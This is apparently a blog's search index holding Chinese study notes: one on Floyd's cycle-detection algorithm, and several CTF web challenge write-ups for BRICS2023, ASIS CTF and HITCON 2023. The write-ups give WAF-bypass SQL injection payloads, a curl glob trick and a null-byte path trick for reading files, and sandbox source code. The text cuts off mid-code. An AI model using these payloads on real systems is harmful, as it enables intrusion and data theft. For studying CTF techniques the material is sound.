<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2023/09/29：Floyd算法</title>
    <link href="/2023/09/29/Floyd%E7%AE%97%E6%B3%95/"/>
    <url>/2023/09/29/Floyd%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>不知道为啥记了这个<br><a href="https://blog.csdn.net/Jasonchen1224/article/details/131276343">https://blog.csdn.net/Jasonchen1224/article/details/131276343</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>龟兔赛跑算法，是一个可以在有限状态机、迭代函数或者链表上判断是否存在环，以及判断环的起点与长度的算法，需要使用两个指针，人为规定移动较快的快指针速度是移动较慢的慢指针的2倍</p><h2 id="环的判定"><a href="#环的判定" class="headerlink" title="环的判定"></a>环的判定</h2><p>可能出现两种情形：<br>1.快速指针达到链表尾，此时无环<br>2.快速指针在遍历时赶上慢指针，此时有环</p><h2 id="算法逻辑"><a href="#算法逻辑" class="headerlink" title="算法逻辑"></a>算法逻辑</h2><p>设a为链表头到环起点的距离，b为环起点到两指针第一次相遇的距离，c为环周长<br>相遇时，慢指针移动距离S1：<br>S1=a+b+n<em>c;<br>快指针移动距离S2：<br>S2=a+b+m</em>c;<br>在两指针移动次数相同时，S2=2<em>S1;<br>此时，可得：<br>a+b+m</em>c=2*(a+b+n<em>c);<br>a+b=m</em>c-2<em>n</em>c=(m-2<em>n)<em>c=k</em>c;<br>进行简化，可得：<br>a+b=k</em>c;<br>a=k<em>c-b;<br>通过以上寻找环起点位置:<br>如果两指针相遇后，将头节点赋值给慢指针，快指针位置不变，以每次步长为1移动，快慢指针最后相遇在环起点位置，此时慢指针走过a，快指针走过k</em>c-b=a</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/28：BRICS2023</title>
    <link href="/2023/09/28/BRICS2023/"/>
    <url>/2023/09/28/BRICS2023/</url>
    
    <content type="html"><![CDATA[<h2 id="ChadCPT"><a href="#ChadCPT" class="headerlink" title="ChadCPT"></a>ChadCPT</h2><p>SQL注入，有两解<br>1.<br>WAF将<code>&#39;</code>和<code>&quot;</code>转义，以replace形式将<code>&#39;</code>替换为<code>\&#39;</code>，转义不完全，可以分别使用<code>\&#39;</code>和<code>\&quot;</code>代替<br>2.<br>注意以下代码：<br>waf:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">trySanitizeJson</span><span class="hljs-params">(r *http.Request)</span></span> (<span class="hljs-type">bool</span>, []<span class="hljs-type">byte</span>) &#123;<br><span class="hljs-keyword">var</span> j any<br><span class="hljs-keyword">var</span> buf bytes.Buffer<br>tee := io.TeeReader(r.Body, &amp;buf)<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>r.Body.Close()<br>r.Body = io.NopCloser(&amp;buf)<br>&#125;()<br><span class="hljs-keyword">if</span> err := json.NewDecoder(tee).Decode(&amp;j); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br>j = safeJsonStringValue(j)<br>newJsonBody, err := json.Marshal(j)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, newJsonBody<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ph := os.Getenv(<span class="hljs-string">&quot;PROXY_HOST&quot;</span>)<br>u, err := url.Parse(ph)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>rp := httputil.NewSingleHostReverseProxy(u)<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(writer http.ResponseWriter, request *http.Request)</span></span> &#123;<br>ct := request.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>)<br><span class="hljs-keyword">if</span> ct == <span class="hljs-string">&quot;application/json&quot;</span> &#123;<br>san, newJsonBody := trySanitizeJson(request)<br><span class="hljs-keyword">if</span> san &#123;<br>request.Body = io.NopCloser(bytes.NewReader(newJsonBody))<br>request.ContentLength = <span class="hljs-type">int64</span>(<span class="hljs-built_in">len</span>(newJsonBody))<br>&#125;<br>&#125;<br>rp.ServeHTTP(writer, request)<br>&#125;)<br>log.Println(http.ListenAndServe(<span class="hljs-string">&quot;:5001&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br></code></pre></td></tr></table></figure><p>在waf中，如果json解码失败waf会代理请求，以此为突破口<br>继续查看源代码，发现waf使用的是<code>encoding/json</code>而app使用的是<code>github.com/francoispqt/gojay</code>，对于json的处理不同<br>可以构造这样的json:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>  <span class="hljs-string">&quot;maxTokens&quot;</span>: <span class="hljs-number">123</span>,<br>  <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-string">&quot;asd&#x27;OR 1=2 UNION SELECT flag FROM flags -- &quot;</span>,<br>  asd<br>&#125;<br></code></pre></td></tr></table></figure><p>这个json不会被waf原生的库解码，会进入代理被gojay解码，完成sql注入</p><h2 id="GigaChadGPT"><a href="#GigaChadGPT" class="headerlink" title="GigaChadGPT"></a>GigaChadGPT</h2><p>还是SQL，上一题升级版，WAF升级为白名单<br>只考虑json解码，同上</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ASISCTF</title>
    <link href="/2023/09/28/ASISCTF/"/>
    <url>/2023/09/28/ASISCTF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackmd.io/@parrot409/H1VJQZEep">https://hackmd.io/@parrot409/H1VJQZEep</a></p><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Flag is at /flag.txt</span><br><span class="hljs-comment">Hint for beginners: read curl&#x27;s manpage.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;file:///hi.txt&#x27;</span>;<br><span class="hljs-keyword">if</span>(<br><span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp;<br>!<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]),<span class="hljs-string">&#x27;file&#x27;</span>) &amp;&amp; <br>!<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]),<span class="hljs-string">&#x27;flag&#x27;</span>)<br>)&#123;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>&#125;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;curl &#x27;</span>.<span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$url</span>));<br></code></pre></td></tr></table></figure><p>提示通配符绕过<br><code>http://45.147.231.180:8000/?x=fil[a-z:1]:///[a-z]ext.txt</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">const fs = require(&#x27;node:fs&#x27;);<br>const path = require(&#x27;path&#x27;)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">I wonder what is inside /next.txt  </span><br><span class="hljs-comment">*/</span><br><br>const secret = &#x27;<span class="hljs-number">39</span>c8e9953fe8ea40ff1c59876e0e2f28&#x27;<br>const server = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bun</span>.</span></span>serve(&#123;<br>  port: <span class="hljs-number">8000</span>,<br>  fetch(req) &#123;<br>  <span class="hljs-keyword">let</span> url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">URL(<span class="hljs-params">req</span>.<span class="hljs-params">url</span>)</span>;<br>  <span class="hljs-keyword">let</span> pname = url.pathname;<br>  <span class="hljs-keyword">if</span>(pname.starts<span class="hljs-constructor">With(`<span class="hljs-operator">/</span>$&#123;<span class="hljs-params">secret</span>&#125;`)</span>)&#123;<br>      <span class="hljs-keyword">if</span>(pname.starts<span class="hljs-constructor">With(`<span class="hljs-operator">/</span>$&#123;<span class="hljs-params">secret</span>&#125;<span class="hljs-operator">/</span><span class="hljs-params">read</span>`)</span>)&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>          <span class="hljs-keyword">let</span> fpath = url.searchParams.get(&#x27;file&#x27;);<br>          <span class="hljs-keyword">if</span>(path.basename(fpath).index<span class="hljs-constructor">Of(&#x27;<span class="hljs-params">next</span>&#x27;)</span><span class="hljs-operator"> == </span>-<span class="hljs-number">1</span>)&#123; <br>            return <span class="hljs-keyword">new</span> <span class="hljs-constructor">Response(<span class="hljs-params">fs</span>.<span class="hljs-params">readFileSync</span>(<span class="hljs-params">fpath</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(&#x27;<span class="hljs-params">base64</span>&#x27;)</span>);<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>            return <span class="hljs-keyword">new</span> <span class="hljs-constructor">Response(&#x27;<span class="hljs-params">no</span> <span class="hljs-params">way</span>&#x27;)</span>;<br>          &#125;<br>        &#125; catch(e)&#123; &#125;<br>        return <span class="hljs-keyword">new</span> <span class="hljs-constructor">Response(<span class="hljs-string">&quot;Couldn&#x27;t read your file :(&quot;</span>)</span>;<br>      &#125;<br>      return <span class="hljs-keyword">new</span> <span class="hljs-constructor">Response(`<span class="hljs-params">did</span> <span class="hljs-params">you</span> <span class="hljs-params">know</span> <span class="hljs-params">i</span> <span class="hljs-params">can</span> <span class="hljs-params">read</span> <span class="hljs-params">files</span>?? <span class="hljs-params">amazing</span> <span class="hljs-params">right</span>,,, <span class="hljs-params">maybe</span> <span class="hljs-params">try</span> <span class="hljs-operator">/</span>$&#123;<span class="hljs-params">secret</span>&#125;<span class="hljs-operator">/</span><span class="hljs-params">read</span><span class="hljs-operator">/</span>?<span class="hljs-params">file</span>=<span class="hljs-operator">/</span><span class="hljs-params">proc</span><span class="hljs-operator">/</span><span class="hljs-params">self</span><span class="hljs-operator">/</span><span class="hljs-params">cmdline</span>`)</span>;<br>    &#125;<br>    return <br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>用<code>/next.js%00/.</code>绕过<br><code>fs.readFileSync</code>不检查空字节，<code>path.basename</code>只执行<code>path.slice(lastIndexOfSlash+1)</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/19：HITCON2023</title>
    <link href="/2023/09/28/HITCON2023/"/>
    <url>/2023/09/28/HITCON2023/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Canvas">https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Canvas</a><br>大学牲看不来这个，尽量看吧</p><h2 id="Canves"><a href="#Canves" class="headerlink" title="Canves"></a>Canves</h2><p>js沙箱逃逸+CSP绕过+xss?</p><h3 id="关于docker"><a href="#关于docker" class="headerlink" title="关于docker"></a>关于docker</h3><p>根据这篇wp，执行<code>docker-compose up -d</code>前需要创建一个<code>.env</code>文件，写上<code>SITE=http://web</code><br>当然也可以装作没看到这句话直接起，但是很慢且可能出错导致失败提升血压</p><h3 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h3><p>翻译一下，“可以发现在web的worker里面有个‘jain’（老外意义不明简写？）可以进行js命令执行，目标是通过某种方法从localStorage获得flag”<br>这什么玩意？</p><h4 id="先看看web里有啥"><a href="#先看看web里有啥" class="headerlink" title="先看看web里有啥"></a>先看看web里有啥</h4><p>main.js</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// sample code taken from https://www.dwitter.net/d/18597</span><br>const fallback =<br>localStorage.savedCode ??<br>&#x27;<span class="hljs-keyword">with</span>(x)<span class="hljs-keyword">for</span>(i=<span class="hljs-number">999</span>;i--;fill<span class="hljs-constructor">Rect(~<span class="hljs-params">setTransform</span>(<span class="hljs-params">s</span>=24e3<span class="hljs-operator">/</span><span class="hljs-params">i</span>,0,0,4<span class="hljs-operator">*</span><span class="hljs-params">s</span>,960-<span class="hljs-params">i</span>+9<span class="hljs-operator">*</span><span class="hljs-params">s</span><span class="hljs-operator">*</span>C(<span class="hljs-params">a</span>=<span class="hljs-params">i</span>+60<span class="hljs-operator">*</span><span class="hljs-params">t</span>)</span>,<span class="hljs-number">540</span>+<span class="hljs-number">8</span>*s*<span class="hljs-constructor">S(<span class="hljs-params">a</span>)</span>),~rotate(<span class="hljs-constructor">T(<span class="hljs-params">a</span><span class="hljs-operator">*</span><span class="hljs-params">a</span>)</span>),<span class="hljs-number">2</span>,<span class="hljs-number">2</span>))fillStyle=<span class="hljs-constructor">R(9,<span class="hljs-params">i</span><span class="hljs-operator">/</span>4,<span class="hljs-params">i</span><span class="hljs-operator">/</span>3)</span>&#x27;<br><span class="hljs-keyword">let</span> code = <span class="hljs-keyword">new</span> <span class="hljs-constructor">URLSearchParams(<span class="hljs-params">location</span>.<span class="hljs-params">search</span>)</span>.get(&#x27;code&#x27;) ?? fallback<br>localStorage.savedCode = code<br><br>const worker = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Worker(&#x27;<span class="hljs-params">worker</span>.<span class="hljs-params">js</span>&#x27;)</span><br>worker.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">message</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">event</span>)</span> &#123;<br><span class="hljs-keyword">if</span> (event.data.<span class="hljs-keyword">type</span><span class="hljs-operator"> === </span>&#x27;error&#x27;) &#123;<br>document.get<span class="hljs-constructor">ElementById(&#x27;<span class="hljs-params">error</span>-<span class="hljs-params">output</span>&#x27;)</span>.set<span class="hljs-constructor">HTML(<span class="hljs-params">event</span>.<span class="hljs-params">data</span>.<span class="hljs-params">content</span>)</span><br>&#125;<br>&#125;)<br>const canvas = document.get<span class="hljs-constructor">ElementById(&#x27;<span class="hljs-params">canvas</span>&#x27;)</span>.transfer<span class="hljs-constructor">ControlToOffscreen()</span><br>worker.post<span class="hljs-constructor">Message(&#123; <span class="hljs-params">type</span>: &#x27;<span class="hljs-params">init</span>&#x27;, <span class="hljs-params">code</span>, <span class="hljs-params">canvas</span> &#125;, [<span class="hljs-params">canvas</span>])</span><br><br>const form = document.get<span class="hljs-constructor">ElementById(&#x27;<span class="hljs-params">code</span>-<span class="hljs-params">form</span>&#x27;)</span><br>form.code.value = code<br><br>document.get<span class="hljs-constructor">ElementById(&#x27;<span class="hljs-params">btn</span>-<span class="hljs-params">reset</span>&#x27;)</span>.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">function</span> ()</span> &#123;<br>delete localStorage.savedCode<br>location = <span class="hljs-character">&#x27;/&#x27;</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>可以看到mian.js中第一行代码在localStorage后有一长串单引号包起来的玩意，这些就是刚进入题目时代码框里的代码，百度可知通过html的canves可以让这些代码生成一张图片，就是点进去映入眼帘的动图<br>大概意思是main.js用worker.js生成了个<code>&lt;canves&gt;</code>，可以操作它，重点应该在worker.js那里<br>worker.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">allKeys</span>(<span class="hljs-params">obj</span>) &#123;<br><span class="hljs-keyword">let</span> keys = []<br><span class="hljs-keyword">while</span> (obj !== <span class="hljs-literal">null</span>) &#123;<br>keys = keys.<span class="hljs-title function_">concat</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(obj))<br>keys = keys.<span class="hljs-title function_">concat</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptors</span>(obj)))<br>obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj)<br>&#125;<br><span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(keys)]<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">s</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>(s)<br>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)<br>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)<br>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#039;&#x27;</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">html</span>(<span class="hljs-params">htmls, ...vals</span>) &#123;<br><span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; htmls.<span class="hljs-property">length</span>; i++) &#123;<br>result += htmls[i]<br>result += escapeHTML(vals[i] ?? <span class="hljs-string">&#x27;&#x27;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> result<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hardening</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">const</span> fnCons = [<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;&#125;, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;&#125;, <span class="hljs-keyword">function</span>* () &#123;&#125;, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* () &#123;&#125;].<span class="hljs-title function_">map</span>(<br><span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> f.<span class="hljs-property">constructor</span><br>)<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> c <span class="hljs-keyword">of</span> fnCons) &#123;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(c.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">&#x27;constructor&#x27;</span>, &#123;<br><span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Nope&#x27;</span>)<br>&#125;,<br><span class="hljs-attr">set</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Nope&#x27;</span>)<br>&#125;,<br><span class="hljs-attr">configurable</span>: <span class="hljs-literal">false</span><br>&#125;)<br>&#125;<br><span class="hljs-keyword">const</span> cons = [<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Array</span>, <span class="hljs-title class_">Number</span>, <span class="hljs-title class_">String</span>, <span class="hljs-title class_">Boolean</span>, <span class="hljs-title class_">Date</span>, <span class="hljs-title class_">RegExp</span>, <span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Symbol</span>, <span class="hljs-title class_">BigInt</span>].<span class="hljs-title function_">concat</span>(fnCons)<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> c <span class="hljs-keyword">of</span> cons) &#123;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(c)<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(c.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)<br>&#125;<br>&#125;<br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;init&#x27;</span>) &#123;<br><span class="hljs-keyword">const</span> canvas = event.<span class="hljs-property">data</span>.<span class="hljs-property">canvas</span><br><span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&#x27;2d&#x27;</span>)<br><br><span class="hljs-comment">// taken from https://github.com/lionleaf/dwitter/blob/83cd600567692babb13ffec314c6066c4dfa04e4/dwitter/templates/dweet/dweet.html#L267-L270</span><br><span class="hljs-keyword">const</span> R = <span class="hljs-keyword">function</span> (<span class="hljs-params">r, g, b, a</span>) &#123;<br>a = a === <span class="hljs-literal">undefined</span> ? <span class="hljs-number">1</span> : a<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rgba(&#x27;</span> + (r | <span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + (g | <span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + (b | <span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + a + <span class="hljs-string">&#x27;)&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">const</span> customArgs = [<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>]<br><span class="hljs-keyword">const</span> argNames = customArgs.<span class="hljs-title function_">concat</span>(<span class="hljs-title function_">allKeys</span>(self))<br><span class="hljs-comment">// run user code in an isolated environment</span><br><span class="hljs-keyword">const</span> fn = <span class="hljs-title class_">Function</span>(...argNames, event.<span class="hljs-property">data</span>.<span class="hljs-property">code</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">callUserFn</span> = t =&gt; &#123;<br><span class="hljs-keyword">try</span> &#123;<br>fn.<span class="hljs-title function_">apply</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>), [canvas, ctx, t, <span class="hljs-title class_">Math</span>.<span class="hljs-property">sin</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">cos</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">tan</span>, R])<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;User function error&#x27;</span>, e)<br><span class="hljs-title function_">postMessage</span>(&#123;<br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>,<br><span class="hljs-attr">content</span>: html`<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Script Error<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span></span><span class="hljs-subst">$&#123;e.message ?? <span class="hljs-string">&#x27;&#x27;</span>&#125;</span>\n<span class="hljs-subst">$&#123;e.stack ?? <span class="hljs-string">&#x27;&#x27;</span>&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml"><span 